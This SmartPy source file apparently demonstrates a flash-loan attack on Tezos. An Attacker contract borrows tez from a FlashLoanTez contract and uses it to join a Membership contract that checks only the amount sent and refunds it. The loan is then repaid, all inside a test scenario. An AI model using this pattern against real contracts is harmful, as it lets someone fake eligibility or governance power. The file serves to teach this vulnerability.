import smartpy as sp

@sp.module
def main():

    class FlashLoanTez(sp.Contract):
        def __init__(self, owner, interest_rate):
            self.data.owner = owner
            self.data.interest_rate = interest_rate
            self.data.in_progress = False
            self.data.loan_amount = sp.tez(0)
            self.data.borrower = owner
            self.data.repaid = False

        @sp.entrypoint
        def deposit(self):
            pass
        
        @sp.entrypoint
        def borrow(self, loan_amount, callback):
            assert not self.data.in_progress
            self.data.in_progress = True

            self.data.borrower = sp.sender
            self.data.loan_amount = loan_amount
            
            sp.send(sp.sender, loan_amount)

            sp.transfer((), sp.tez(0), callback)
            
            flash_loan_check_repaid = sp.contract(sp.unit, sp.self_address(), entrypoint="check_repaid").unwrap_some()
            sp.transfer((), sp.tez(0), flash_loan_check_repaid)

        @sp.entrypoint
        def repay(self):
            assert self.data.in_progress
            assert sp.amount >= sp.split_tokens(self.data.loan_amount, 100 + self.data.interest_rate, 100)
            self.data.repaid = True
        
        @sp.entrypoint
        def check_repaid(self):
            assert self.data.in_progress
            assert self.data.repaid
            self.data.in_progress = False

        @sp.entrypoint
        def claim(self):
            assert sp.sender == self.data.owner
            assert not self.data.in_progress
            sp.send(sp.sender, sp.balance)
    

    class Membership(sp.Contract):
        def __init__(self, membership_threshold):
            self.data.membership_threshold = membership_threshold
            self.data.members = sp.set()

        @sp.entrypoint
        def join(self):
            assert sp.amount == self.data.membership_threshold
            self.data.members.add(sp.sender)
            sp.send(sp.sender, sp.amount)

        @sp.onchain_view
        def is_member(self, user):
            sp.cast(user, sp.address)
            return self.data.members.contains(user)
        
        @sp.entrypoint
        def leave(self):
            self.data.members.remove(sp.sender)
           
            
    class Attacker(sp.Contract):
        def __init__(self, membership, flash_loan, membership_threshold):
            self.data.membership = membership
            self.data.flash_loan = flash_loan
            self.data.membership_threshold = membership_threshold

        @sp.entrypoint
        def impersonate_rich_person(self):
            flash_loan_borrow = sp.contract(sp.record(loan_amount = sp.mutez, callback = sp.contract[sp.unit]),
                                             self.data.flash_loan,
                                             entrypoint="borrow").unwrap_some()
            attack_callback = sp.contract(sp.unit, sp.self_address(), entrypoint = "attack_callback").unwrap_some()
            sp.transfer(sp.record(loan_amount = self.data.membership_threshold, callback = attack_callback), sp.tez(0), flash_loan_borrow)

        @sp.entrypoint
        def attack_callback(self):
            membership_contract = sp.contract(sp.unit, self.data.membership, entrypoint = "join").unwrap_some()
            sp.transfer((),  self.data.membership_threshold, membership_contract)

            amount_repaid = self.data.membership_threshold + sp.tez(100)
            trace(amount_repaid)
            flash_loan_repay = sp.contract(sp.unit, self.data.flash_loan, entrypoint="repay").unwrap_some()
            sp.transfer((), amount_repaid, flash_loan_repay)
        
        @sp.entrypoint
        def default(self):
            pass

@sp.add_test()
def test():
    alice = sp.test_account("alice")
    bob = sp.test_account("bob")
    scenario = sp.test_scenario("Test", main)

    membership = main.Membership(sp.tez(10000))
    scenario += membership

    flash_loan = main.FlashLoanTez(owner = alice.address, interest_rate = 1)
    scenario += flash_loan
    flash_loan.deposit(_sender = alice, _amount = sp.tez(100000))
    
    attacker = main.Attacker(membership = membership.address, flash_loan = flash_loan.address, membership_threshold = sp.tez(10000))
    scenario += attacker
    attacker.impersonate_rich_person(_sender = bob, _amount = sp.tez(500))


